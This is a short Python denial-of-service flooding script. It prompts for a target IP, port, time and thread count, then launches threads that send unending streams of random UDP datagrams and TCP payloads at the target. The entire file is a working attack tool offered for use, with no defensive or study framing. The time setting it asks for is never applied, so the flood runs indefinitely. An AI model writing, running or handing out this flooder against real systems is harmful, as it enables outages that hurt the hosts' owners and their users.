import random
import socket
import threading
import os
import time
from colorama import Fore, init

init()

###### MESSAGE MIKA ON TOP! #####
os.system("clear")


ip = str(input(" Target IP :"))
port = int(input(" Target Port :"))
times = int(input(" Time :"))
threads = int(input(" Threads :"))

def udp_attack():
    data = random._urandom(1024)
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            addr = (ip, port)
            s.sendto(data, addr)
            print(f"{Fore.GREEN}Send UDP Packet To {Fore.RED}{ip}:{port}{Fore.WHITE}")
        except:
            print("[!] Error!!!")

def tcp_attack():
    data = random._urandom(1024)
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((ip, port))
            s.send(data)
            print(f"{Fore.GREEN}Send TCP Packet To {Fore.RED}{ip}:{port}{Fore.WHITE}")
        except:
            print("[!] Error!!!")

for _ in range(threads):
    th = threading.Thread(target=udp_attack)
    th.start()
    th = threading.Thread(target=tcp_attack)
    th.start()
